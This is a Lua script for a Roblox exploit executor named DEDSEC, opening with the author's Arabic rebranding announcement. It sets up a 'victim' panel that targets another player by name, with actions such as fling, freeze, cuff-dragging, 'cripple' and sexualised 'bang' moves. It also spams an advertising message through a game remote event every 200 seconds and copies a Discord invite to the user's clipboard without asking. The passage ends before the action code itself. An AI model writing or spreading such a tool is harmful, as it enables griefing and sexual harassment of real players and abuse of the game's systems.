-- ===================================================== --
--                سكريبت DEDSEC مع الإعلان والموسيقى     --
-- ===================================================== --

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer

-- متغيرات الموسيقى
local musicSound = nil
local musicFadeInTween = nil
local musicFadeOutTween = nil

-- دالة تشغيل الموسيقى مع Fade In
function playMusicWithFadeIn(soundId, fadeTime)
    musicSound = Instance.new("Sound")
    musicSound.SoundId = "rbxassetid://" .. soundId
    musicSound.Volume = 0
    musicSound.Looped = true
    musicSound.Parent = CoreGui
    musicSound:Play()
    
    -- Fade In
    musicFadeInTween = TweenService:Create(musicSound, TweenInfo.new(fadeTime, Enum.EasingStyle.Linear), {Volume = 1})
    musicFadeInTween:Play()
end

-- دالة إيقاف الموسيقى مع Fade Out
function fadeOutAndStopMusic(fadeTime)
    if musicSound then
        musicFadeOutTween = TweenService:Create(musicSound, TweenInfo.new(fadeTime, Enum.EasingStyle.Linear), {Volume = 0})
        musicFadeOutTween:Play()
        musicFadeOutTween.Completed:Connect(function()
            if musicSound then
                musicSound:Stop()
                musicSound:Destroy()
                musicSound = nil
            end
        end)
    end
end

-- ========== بداية الإعلان ==========
local blurEffect = Instance.new("BlurEffect")
blurEffect.Name = "MessageBlur"
blurEffect.Size = 20
blurEffect.Parent = Lighting

local messageGui = Instance.new("ScreenGui")
messageGui.Name = "ImportantMessage"
messageGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
messageGui.ResetOnSpawn = false
messageGui.Parent = CoreGui

local container = Instance.new("Frame")
container.Size = UDim2.new(1, 0, 1, 0)
container.BackgroundTransparency = 1
container.Parent = messageGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 70)
title.Position = UDim2.new(0, 20, 0, 20)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.new(1, 0.3, 0.3)
title.Text = "📢 إعلان مهم جدًا للجميع"
title.TextSize = 36
title.Font = Enum.Font.GothamBlack
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Top
title.TextStrokeTransparency = 0.5
title.TextStrokeColor3 = Color3.new(0, 0, 0)
title.Parent = container

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -80, 1, -160)
scrollFrame.Position = UDim2.new(0, 40, 0, 100)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.Parent = container

local messageText = Instance.new("TextLabel")
messageText.Size = UDim2.new(1, -20, 0, 0)
messageText.Position = UDim2.new(0, 10, 0, 0)
messageText.BackgroundTransparency = 1
messageText.TextColor3 = Color3.new(1, 1, 1)
messageText.Text = [[
اليوم أعلن رسميًا لتغيير الهويه سيرفر والسكريبت بالكامل

اسم وحيد كان مجرد اسم حطيته في البدايات على سبيل الطقطقة وما كنت أتوقع أوصل لهالمرحلة من الانتشار والقوه هذه والحمد لله احمد ربي بان الان اسكريبت صار مشهور من فضلكم 

الاسم القديم ما عاد يمثلني، وكان اختيار عشوائي في وقت البدايات واليوم جاء الوقت أصحح لنغير فيه 

اسمي شخصي اللي ابغاكم تنادوني فيه هو فارس ولحد يناديني وحيد خلاص اسم وحيد انتهى الان انا فارس وكل شيء بيتغير معنى اسم السيرفر اسم السكربتات الهوية كاملة وتكون تحت اسم واحد 
DEDSEC ديداسك 

وفي النهاية… أشكركم كلكم 🤍
لأنكم كنتم السبب بعد الله في كل خطوة وصلت لها، وكنتم الداعم الأول من أول يوم إلى اليوم هذا ثقتكم فيني هي اللي خلتني أستمر وأطور وأوصل لهالمرحله هذا القادم اقوى ومع بعض بنصنع شيء أكبر    

بمناسبه السكريبت الجديد الاساسي راح يكون في ميزات كثير بس انا الان اواجه صعوبات كثيره جدا وما اظن ان السكربت بينزل بس انتم ادعوا باذن الله ينزل ولا احد يستهين بشغلي تراه جدا متعب ياخذ مني وقت طويل وجهد لان السكربت الجديد ما هو باي سكريبت عادي سكربت كبير جداً الان ثمانيه شهور وباقي ما خلصته هذا السكربت لو بينزل بيكسر الدنيا  
 فارس | sj3zx
   DEDSEC
]]
messageText.TextSize = 18
messageText.Font = Enum.Font.GothamBold
messageText.TextWrapped = true
messageText.RichText = true
messageText.Parent = scrollFrame

task.wait()
local textHeight = messageText.TextBounds.Y + 20
messageText.Size = UDim2.new(1, -20, 0, textHeight)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, textHeight + 20)

local startButton = Instance.new("TextButton")
startButton.Size = UDim2.new(0, 220, 0, 55)
startButton.Position = UDim2.new(0.5, -110, 1, -80)
startButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
startButton.BackgroundTransparency = 0.2
startButton.TextColor3 = Color3.new(1, 1, 1)
startButton.Text = "ابدأ السكريبت"
startButton.TextSize = 22
startButton.Font = Enum.Font.GothamBlack
startButton.BorderSizePixel = 2
startButton.BorderColor3 = Color3.new(1, 1, 1)
startButton.Parent = container

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 10)
btnCorner.Parent = startButton

startButton.MouseEnter:Connect(function()
    TweenService:Create(startButton, TweenInfo.new(0.2), {Size = UDim2.new(0, 230, 0, 60)}):Play()
end)
startButton.MouseLeave:Connect(function()
    TweenService:Create(startButton, TweenInfo.new(0.2), {Size = UDim2.new(0, 220, 0, 55)}):Play()
end)

-- منع التفاعل مع الخلفية
container.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        input:Consume()
    end
end)

-- تشغيل الموسيقى مع Fade In فور ظهور الإعلان
playMusicWithFadeIn("89704614419647", 3) -- 3 ثواني Fade In

-- ========== دالة بدء السكريبت الرئيسي ==========
function startMainScript()
    -- إزالة الإعلان
    messageGui:Destroy()
    blurEffect:Destroy()
    
    -- متغيرات الموسيقى ستستمر حتى ننهيها بعد الأنيميشن
    
    -- هنا يبدأ الكود الأساسي (من بعد السطر "local Players = game:GetService("Players")" مع بعض التعديلات)
    
    -- نبدأ بتنفيذ السكريبت الأساسي (مع تغليف كل شيء في دالة لحمايته)
    -- نضيف المتغيرات المكررة لكنها محلية داخل الدالة
    
    -- ========== السكريبت الأساسي ==========
    
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local CoreGui = game:GetService("CoreGui")
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local Lighting = game:GetService("Lighting")
    local Workspace = game:GetService("Workspace")
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local player = Players.LocalPlayer

    -- ⚡ الأوامر التلقائية عند بدء التشغيل
    function executeStartupCommands()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        
        -- الانتظار حتى يتم تحميل اللعبة بالكامل
        task.wait(5)
        
        -- الأمر الثاني: إرسال كل 5 دقائق
        while true do
            task.wait(200)
            pcall(function()
                local SendMessage = ReplicatedStorage.Events.FindMe
                local args = {
                    "★  ＳｃＲｉＰＴ『ＤＥＤＳＥＣ』★"
                }
                SendMessage:FireServer(unpack(args))
            end)
        end
    end

    -- تشغيل الأوامر التلقائية
    coroutine.wrap(executeStartupCommands)()

    -- نظام الإشعارات المحسن
    NotificationGui = Instance.new("ScreenGui")
    NotificationGui.Name = "Notifications"
    NotificationGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    NotificationGui.ResetOnSpawn = false
    NotificationGui.Parent = CoreGui

    -- نظام الصوت للإشعارات
    function playNotificationSound()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://17208372272"
        sound.Parent = NotificationGui
        sound:Play()
        
        task.delay(2, function()
            if sound then
                sound:Stop()
                sound:Destroy()
            end
        end)
    end

    activeNotifications = {}
    lastVictim = nil

    function findIndex(tbl, item)
        for i, v in ipairs(tbl) do
            if v == item then
                return i
            end
        end
        return nil
    end

    -- دالة لتحميل صور اللاعبين
    function loadPlayerImage(userId)
        local success, result = pcall(function()
            local url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
            return url
        end)
        
        if success then
            return result
        else
            return "rbxasset://textures/ui/GuiImagePlaceholder.png"
        end
    end

    function showNotification(message, playerInfo, hasCloseButton)
        coroutine.wrap(playNotificationSound)()
        
        local notification = Instance.new("Frame")
        notification.Size = UDim2.new(0, 300, 0, 70)
        notification.Position = UDim2.new(1, -310, 0, 10 + (#activeNotifications * 80))
        notification.BackgroundColor3 = Color3.new(0, 0, 0)
        notification.BackgroundTransparency = 0.5
        notification.BorderSizePixel = 3
        notification.BorderColor3 = Color3.new(1, 1, 1)
        notification.ZIndex = 100
        
        local notifCorner = Instance.new("UICorner")
        notifCorner.CornerRadius = UDim.new(0, 8)
        notifCorner.Parent = notification
        
        local messageLabel = Instance.new("TextLabel")
        messageLabel.Size = UDim2.new(1, -10, hasCloseButton and 0.7 or 1, hasCloseButton and -5 or 0)
        messageLabel.Position = UDim2.new(0, 5, 0, 5)
        messageLabel.BackgroundTransparency = 1
        messageLabel.TextColor3 = Color3.new(1, 1, 1)
        messageLabel.Text = message
        messageLabel.TextSize = 14
        messageLabel.Font = Enum.Font.GothamBlack
        messageLabel.TextWrapped = true
        messageLabel.Parent = notification
        
        if hasCloseButton then
            local closeButton = Instance.new("TextButton")
            closeButton.Size = UDim2.new(0, 50, 0, 20)
            closeButton.Position = UDim2.new(0.5, -25, 0.7, 5)
            closeButton.BackgroundColor3 = Color3.new(0, 0, 0)
            closeButton.BackgroundTransparency = 0.5
            closeButton.TextColor3 = Color3.new(1, 1, 1)
            closeButton.Text = "تم"
            closeButton.TextSize = 12
            closeButton.Font = Enum.Font.GothamBlack
            closeButton.BorderSizePixel = 3
            closeButton.BorderColor3 = Color3.new(1, 1, 1)
            closeButton.Parent = notification
            
            local closeCorner = Instance.new("UICorner")
            closeCorner.CornerRadius = UDim.new(0, 4)
            closeCorner.Parent = closeButton
            
            closeButton.MouseButton1Click:Connect(function()
                local index = findIndex(activeNotifications, notification)
                if index then
                    table.remove(activeNotifications, index)
                end
                
                local tweenOut = TweenService:Create(notification, TweenInfo.new(0.5), {Position = UDim2.new(1, 350, 0, notification.Position.Y.Offset)})
                tweenOut:Play()
                
                task.wait(0.5)
                notification:Destroy()
                
                for i, notif in ipairs(activeNotifications) do
                    notif.Position = UDim2.new(1, -310, 0, 10 + ((i-1) * 80))
                end
            end)
        end
        
        if playerInfo then
            local playerImage = Instance.new("ImageLabel")
            playerImage.Size = UDim2.new(0, 40, 0, 40)
            playerImage.Position = UDim2.new(0, 10, 0, 15)
            playerImage.BackgroundTransparency = 1
            playerImage.BorderSizePixel = 0
            playerImage.Image = playerInfo.Image
            playerImage.Parent = notification
            
            local imageCorner = Instance.new("UICorner")
            imageCorner.CornerRadius = UDim.new(1, 0)
            imageCorner.Parent = playerImage
            
            messageLabel.Position = UDim2.new(0, 60, 0, 10)
            messageLabel.Size = UDim2.new(1, -70, hasCloseButton and 0.7 or 1, hasCloseButton and -5 or 0)
        end
        
        notification.Parent = NotificationGui
        table.insert(activeNotifications, notification)
        
        notification.Position = UDim2.new(1, 350, 0, notification.Position.Y.Offset)
        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        local tween = TweenService:Create(notification, tweenInfo, {Position = UDim2.new(1, -310, 0, notification.Position.Y.Offset)})
        tween:Play()
        
        if not hasCloseButton then
            task.delay(5, function()
                if notification.Parent then
                    local tweenOut = TweenService:Create(notification, tweenInfo, {Position = UDim2.new(1, 350, 0, notification.Position.Y.Offset)})
                    tweenOut:Play()
                    
                    task.wait(0.5)
                    notification:Destroy()
                    
                    local index = findIndex(activeNotifications, notification)
                    if index then
                        table.remove(activeNotifications, index)
                    end
                end
            end)
        end
    end

    -- الإشعار الترحيبي
    function showWelcomeNotifications()
        task.wait(1)
        
        local playerImage = loadPlayerImage(player.UserId)
        
        showNotification("منور في سكربت DEDSEC\n" .. player.Name, {
            Image = playerImage
        }, false)
        
        task.wait(3)
        
        showNotification("لا تنسى تنورنا في سيرفر ديسكورد\nفي اخبار هناك حياكم", nil, false)
        
        task.wait(1)
        pcall(function()
            if setclipboard then
                setclipboard("https://discord.gg/GWefVSwgNJ")
            end
        end)
    end

    -- أنيميشن البدء المحسن مع تأثير الضباب
    function showStartupAnimation()
        local blurEffect = Instance.new("BlurEffect")
        blurEffect.Name = "StartupBlur"
        blurEffect.Size = 0
        blurEffect.Parent = Lighting

        local blurTween = TweenService:Create(blurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 24})
        blurTween:Play()

        local StartupGui = Instance.new("ScreenGui")
        StartupGui.Name = "StartupAnimation"
        StartupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        StartupGui.ResetOnSpawn = false

        local Logo = Instance.new("TextLabel")
        Logo.Size = UDim2.new(0, 800, 0, 200)
        Logo.Position = UDim2.new(0.5, -400, 0.5, -100)
        Logo.BackgroundTransparency = 1
        Logo.Text = "DEDSEC"
        Logo.TextColor3 = Color3.new(1, 1, 1)
        Logo.TextSize = 100
        Logo.Font = Enum.Font.GothamBlack
        Logo.Parent = StartupGui

        StartupGui.Parent = CoreGui

        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tweenIn = TweenService:Create(Logo, tweenInfo, {TextColor3 = Color3.new(1, 1, 1), TextTransparency = 0})
        tweenIn:Play()

        Logo.Rotation = 0

        task.wait(4)

        local blurOutTween = TweenService:Create(blurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = 0})
        blurOutTween:Play()

        task.wait(1)

        local tweenOut = TweenService:Create(Logo, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1})
        tweenOut:Play()

        task.wait(1)
        StartupGui:Destroy()
        blurEffect:Destroy()
        
        coroutine.wrap(showWelcomeNotifications)()
    end

    -- تشغيل أنيميشن البدء
    coroutine.wrap(showStartupAnimation)()

    -- الواجهة الرئيسية
    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DEDSEC"
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false

    -- زر التفعيل
    ToggleButton = Instance.new("TextButton")
    ToggleButton.Name = "ToggleButton"
    ToggleButton.Size = UDim2.new(0, 35, 0, 35)
    ToggleButton.Position = UDim2.new(0, 20, 0, 20)
    ToggleButton.BackgroundColor3 = Color3.new(0, 0, 0)
    ToggleButton.BackgroundTransparency = 0.5
    ToggleButton.TextColor3 = Color3.new(1, 1, 1)
    ToggleButton.Text = "DE"
    ToggleButton.TextSize = 16
    ToggleButton.Font = Enum.Font.GothamBlack
    ToggleButton.BorderSizePixel = 3
    ToggleButton.BorderColor3 = Color3.new(1, 1, 1)
    ToggleButton.ZIndex = 10
    ToggleButton.Visible = false

    corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = ToggleButton

    -- الإطار الرئيسي
    MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 350)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
    MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    MainFrame.BackgroundTransparency = 0.5
    MainFrame.BorderSizePixel = 3
    MainFrame.BorderColor3 = Color3.new(1, 1, 1)
    MainFrame.Visible = false
    MainFrame.Active = true
    MainFrame.Draggable = true

    mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 12)
    mainCorner.Parent = MainFrame

    -- العنوان
    Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Position = UDim2.new(0, 0, 0, 0)
    Title.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    Title.BackgroundTransparency = 0.5
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Text = "DEDSEC"
    Title.TextSize = 30
    Title.Font = Enum.Font.GothamBlack
    Title.BorderSizePixel = 0
    Title.TextXAlignment = Enum.TextXAlignment.Center

    titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = Title

    -- خلفية القائمة
    local BackgroundImage = Instance.new("ImageLabel")
    BackgroundImage.Name = "BackgroundImage"
    BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
    BackgroundImage.Position = UDim2.new(0, 0, 0, 0)
    BackgroundImage.BackgroundTransparency = 1
    BackgroundImage.Image = "rbxassetid://122479360824246"
    BackgroundImage.ScaleType = Enum.ScaleType.Crop
    BackgroundImage.ZIndex = 0

    local backgroundCorner = Instance.new("UICorner")
    backgroundCorner.CornerRadius = UDim.new(0, 12)
    backgroundCorner.Parent = BackgroundImage

    MainFrame.ZIndex = 1
    Title.ZIndex = 2

    -- أزرار الأقسام
    TabsFrame = Instance.new("Frame")
    TabsFrame.Name = "TabsFrame"
    TabsFrame.Size = UDim2.new(1, -20, 0, 40)
    TabsFrame.Position = UDim2.new(0, 10, 0, 60)
    TabsFrame.BackgroundTransparency = 1
    TabsFrame.ZIndex = 2

    TabsGrid = Instance.new("UIGridLayout")
    TabsGrid.CellPadding = UDim2.new(0, 5, 0, 0)
    TabsGrid.CellSize = UDim2.new(0.48, 0, 1, 0)
    TabsGrid.FillDirection = Enum.FillDirection.Horizontal
    TabsGrid.Parent = TabsFrame

    function createTabButton(name)
        local button = Instance.new("TextButton")
        button.Name = name
        button.Size = UDim2.new(0, 100, 0, 40)
        button.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
        button.BackgroundTransparency = 0.5
        button.TextColor3 = Color3.new(1, 1, 1)
        button.Text = name
        button.TextSize = 12
        button.Font = Enum.Font.GothamBlack
        button.BorderSizePixel = 3
        button.BorderColor3 = Color3.new(1, 1, 1)
        button.ZIndex = 2
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = button
        
        return button
    end

    VictimTab = createTabButton("الضحيه")
    FeaturesTab = createTabButton("المميزات")

    VictimTab.Parent = TabsFrame
    FeaturesTab.Parent = TabsFrame

    -- إطارات المحتوى لكل قسم
    ContentFrame = Instance.new("Frame")
    ContentFrame.Name = "ContentFrame"
    ContentFrame.Size = UDim2.new(1, -20, 0, 240)
    ContentFrame.Position = UDim2.new(0, 10, 0, 110)
    ContentFrame.BackgroundTransparency = 1
    ContentFrame.ZIndex = 2

    -- قسم الضحية
    VictimSection = Instance.new("Frame")
    VictimSection.Name = "VictimSection"
    VictimSection.Size = UDim2.new(1, 0, 1, 0)
    VictimSection.Position = UDim2.new(0, 0, 0, 0)
    VictimSection.BackgroundTransparency = 1
    VictimSection.Visible = true
    VictimSection.ZIndex = 2

    -- معلومات الضحية
    VictimInfo = Instance.new("Frame")
    VictimInfo.Name = "VictimInfo"
    VictimInfo.Size = UDim2.new(1, 0, 0, 80)
    VictimInfo.Position = UDim2.new(0, 0, 0, 0)
    VictimInfo.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    VictimInfo.BackgroundTransparency = 0.5
    VictimInfo.BorderSizePixel = 3
    VictimInfo.BorderColor3 = Color3.new(1, 1, 1)
    VictimInfo.ZIndex = 2

    infoCorner = Instance.new("UICorner")
    infoCorner.CornerRadius = UDim.new(0, 8)
    infoCorner.Parent = VictimInfo

    VictimAvatar = Instance.new("ImageLabel")
    VictimAvatar.Name = "VictimAvatar"
    VictimAvatar.Size = UDim2.new(0, 50, 0, 50)
    VictimAvatar.Position = UDim2.new(0, 10, 0, 15)
    VictimAvatar.BackgroundTransparency = 1
    VictimAvatar.BorderSizePixel = 0
    VictimAvatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
    VictimAvatar.ZIndex = 2

    avatarCorner = Instance.new("UICorner")
    avatarCorner.CornerRadius = UDim.new(1, 0)
    avatarCorner.Parent = VictimAvatar

    VictimName = Instance.new("TextLabel")
    VictimName.Name = "VictimName"
    VictimName.Size = UDim2.new(0, 350, 0, 25)
    VictimName.Position = UDim2.new(0, 70, 0, 10)
    VictimName.BackgroundTransparency = 1
    VictimName.TextColor3 = Color3.new(1, 1, 1)
    VictimName.Text = "لا يوجد ضحية محددة"
    VictimName.TextSize = 14
    VictimName.Font = Enum.Font.GothamBlack
    VictimName.TextXAlignment = Enum.TextXAlignment.Left
    VictimName.ZIndex = 2

    VictimInfoText = Instance.new("TextLabel")
    VictimInfoText.Name = "VictimInfoText"
    VictimInfoText.Size = UDim2.new(0, 350, 0, 40)
    VictimInfoText.Position = UDim2.new(0, 70, 0, 35)
    VictimInfoText.BackgroundTransparency = 1
    VictimInfoText.TextColor3 = Color3.new(1, 1, 1)
    VictimInfoText.Text = "اللقب: -\nعمر الحساب: -\nID: -\nالأدوات: -"
    VictimInfoText.TextSize = 9
    VictimInfoText.Font = Enum.Font.GothamBold
    VictimInfoText.TextXAlignment = Enum.TextXAlignment.Left
    VictimInfoText.TextYAlignment = Enum.TextYAlignment.Top
    VictimInfoText.TextWrapped = true
    VictimInfoText.ZIndex = 2

    -- إطار الإدخال
    InputFrame = Instance.new("Frame")
    InputFrame.Name = "InputFrame"
    InputFrame.Size = UDim2.new(1, 0, 0, 30)
    InputFrame.Position = UDim2.new(0, 0, 0, 90)
    InputFrame.BackgroundTransparency = 1
    InputFrame.ZIndex = 2

    VictimInput = Instance.new("TextBox")
    VictimInput.Name = "VictimInput"
    VictimInput.Size = UDim2.new(0.7, 0, 1, 0)
    VictimInput.Position = UDim2.new(0, 0, 0, 0)
    VictimInput.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    VictimInput.BackgroundTransparency = 0.5
    VictimInput.TextColor3 = Color3.new(1, 1, 1)
    VictimInput.PlaceholderText = "أدخل اسم المستخدم (3 أحرف على الأقل)"
    VictimInput.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
    VictimInput.Text = ""
    VictimInput.TextSize = 12
    VictimInput.Font = Enum.Font.GothamBold
    VictimInput.BorderSizePixel = 3
    VictimInput.BorderColor3 = Color3.new(1, 1, 1)
    VictimInput.ZIndex = 2

    inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 6)
    inputCorner.Parent = VictimInput

    SetVictimButton = Instance.new("TextButton")
    SetVictimButton.Name = "SetVictimButton"
    SetVictimButton.Size = UDim2.new(0.28, 0, 1, 0)
    SetVictimButton.Position = UDim2.new(0.72, 0, 0, 0)
    SetVictimButton.BackgroundColor3 = Color3.new(0, 0, 0)
    SetVictimButton.BackgroundTransparency = 0.5
    SetVictimButton.TextColor3 = Color3.new(1, 1, 1)
    SetVictimButton.Text = "تحديد الضحية"
    SetVictimButton.TextSize = 12
    SetVictimButton.Font = Enum.Font.GothamBlack
    SetVictimButton.BorderSizePixel = 3
    SetVictimButton.BorderColor3 = Color3.new(1, 1, 1)
    SetVictimButton.ZIndex = 2

    setCorner = Instance.new("UICorner")
    setCorner.CornerRadius = UDim.new(0, 6)
    setCorner.Parent = SetVictimButton

    -- إطار التمرير للأزرار
    ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Name = "ScrollFrame"
    ScrollFrame.Size = UDim2.new(1, 0, 0, 100)
    ScrollFrame.Position = UDim2.new(0, 0, 0, 130)
    ScrollFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    ScrollFrame.BackgroundTransparency = 0.5
    ScrollFrame.BorderSizePixel = 3
    ScrollFrame.BorderColor3 = Color3.new(1, 1, 1)
    ScrollFrame.ScrollBarThickness = 8
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ScrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
    ScrollFrame.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
    ScrollFrame.ZIndex = 2

    scrollCorner = Instance.new("UICorner")
    scrollCorner.CornerRadius = UDim.new(0, 8)
    scrollCorner.Parent = ScrollFrame

    -- شبكة الأزرار
    ButtonGrid = Instance.new("UIGridLayout")
    ButtonGrid.CellPadding = UDim2.new(0, 4, 0, 4)
    ButtonGrid.CellSize = UDim2.new(0, 110, 0, 28)
    ButtonGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    ButtonGrid.SortOrder = Enum.SortOrder.LayoutOrder
    ButtonGrid.Parent = ScrollFrame

    function createButton(name, layoutOrder)
        local button = Instance.new("TextButton")
        button.Name = name
        button.Size = UDim2.new(0, 110, 0, 28)
        button.BackgroundColor3 = Color3.new(0, 0, 0)
        button.BackgroundTransparency = 0.5
        button.TextColor3 = Color3.new(1, 1, 1)
        button.Text = name
        button.TextSize = 10
        button.Font = Enum.Font.GothamBlack
        button.TextStrokeColor3 = Color3.new(0, 0, 0)
        button.TextStrokeTransparency = 0.3
        button.BorderSizePixel = 3
        button.BorderColor3 = Color3.new(1, 1, 1)
        button.LayoutOrder = layoutOrder
        button.ZIndex = 2
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = button
        
        button.MouseEnter:Connect(function()
            local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = TweenService:Create(button, tweenInfo, {
                BackgroundColor3 = Color3.new(0.2, 0.2, 0.2),
                Size = UDim2.new(0, 112, 0, 30)
            })
            tween:Play()
        end)
        
        button.MouseLeave:Connect(function()
            local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = TweenService:Create(button, tweenInfo, {
                BackgroundColor3 = Color3.new(0, 0, 0),
                Size = UDim2.new(0, 110, 0, 28)
            })
            tween:Play()
        end)
        
        button.Parent = ScrollFrame
        return button
    end

    -- قائمة أزرار الضحية
    victimButtons = {
        {name = "مشاهدة", type = "spectate", order = 1},
        {name = "انتقال", type = "teleport", order = 2},
        {name = "اعاده تعيين", type = "reset", order = 3},
        {name = "to", type = "to", order = 4},
        {name = "بانق", type = "bang", order = 5},
        {name = "بانق من الامام", type = "bangFront", order = 6},
        {name = "بانق بالراس", type = "headSuck", order = 7},
        {name = "تعليق سريع", type = "fling", order = 8},
        {name = "تجميد بالكلبشه", type = "freezeCuff", order = 9},
        {name = "سحب بالكلبشه", type = "pullCuff", order = 10},
        {name = "تعليق بالكلبشه", type = "suspendCuff", order = 11},
        {name = "حقيبه في الظهر", type = "backpackSit", order = 12},
        {name = "جلوس على الراس", type = "headSit", order = 13},
        {name = "اعاده تعيين تلقائي", type = "autoReset", order = 14},
        {name = "ايقاف نسخ", type = "stopAll", order = 15},
        {name = "ايقاف نسخ تلقائي", type = "autoStopAll", order = 16},
        {name = "معوق", type = "cripple", order = 17},
        {name = "معوق تلقائي", type = "autoCripple", order = 18},
        {name = "تطيير في الجو", type = "flyInAir", order = 19},
        {name = "تطيير في الجو تلقائي", type = "autoFlyInAir", order = 20},
        {name = "تجميد", type = "suspendF", order = 21},
        {name = "فك تجميد", type = "unsuspendF", order = 22},
        {name = "تجميد تلقائي", type = "autoSuspendF", order = 23},
        {name = "تعليق القفز", type = "suspendJump", order = 24},
        {name = "فك تعليق القفز", type = "unsuspendJump", order = 25},
        {name = "قفز تلقائي", type = "autoJump", order = 26},
        {name = "تعليق الطيران", type = "suspendFly", order = 27},
        {name = "فك تعليق الطيران", type = "unsuspendFly", order = 28},
        {name = "تعليق طيران تلقائي", type = "autoSuspendFly", order = 29},
        {name = "ايقاف الطيران", type = "unfly", order = 30},
        {name = "كلب", type = "dog", order = 31},
        {name = "كلب تلقائي", type = "autoDog", order = 32},
        {name = "دوده", type = "worm", order = 33},
        {name = "حجم كبير", type = "size3", order = 34},
        {name = "سكن Miri", type = "charMiri", order = 35},
        {name = "راس كبير", type = "giantDwarf", order = 36},
        {name = "فار يرقص", type = "ratDance", order = 37},
        {name = "ميت", type = "fakeDeath", order = 38},
        {name = "معضل", type = "buffify", order = 39},
        {name = "عشوائي", type = "emote", order = 40},
        {name = "ارتجاج", type = "phase", order = 41},
        {name = "استلقاء في الهواء", type = "aura", order = 42},
        {name = "نسخ تلقائي 1", type = "autoCopy1", order = 43},
        {name = "نسخ تلقائي 2", type = "autoCopy2", order = 44},
        {name = "نسخ تلقائي 3", type = "autoCopy3", order = 45},
        {name = "نسخ تلقائي 4", type = "autoCopy4", order = 46},
        {name = "نسخ تلقائي 5", type = "autoCopy5", order = 47},
        {name = "نسخ تلقائي 6", type = "autoCopy6", order = 48}
    }

    buttonInstances = {}
    originalButtonNames = {}

    for _, buttonInfo in ipairs(victimButtons) do
        local button = createButton(buttonInfo.name, buttonInfo.order)
        buttonInstances[buttonInfo.type] = button
        originalButtonNames[buttonInfo.type] = buttonInfo.name
    end

    -- قسم المميزات
    FeaturesSection = Instance.new("Frame")
    FeaturesSection.Name = "FeaturesSection"
    FeaturesSection.Size = UDim2.new(1, 0, 1, 0)
    FeaturesSection.Position = UDim2.new(0, 0, 0, 0)
    FeaturesSection.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    FeaturesSection.BackgroundTransparency = 0.5
    FeaturesSection.BorderSizePixel = 3
    FeaturesSection.BorderColor3 = Color3.new(1, 1, 1)
    FeaturesSection.Visible = false
    FeaturesSection.ZIndex = 2

    featuresCorner = Instance.new("UICorner")
    featuresCorner.CornerRadius = UDim.new(0, 8)
    featuresCorner.Parent = FeaturesSection

    FeaturesScrollFrame = Instance.new("ScrollingFrame")
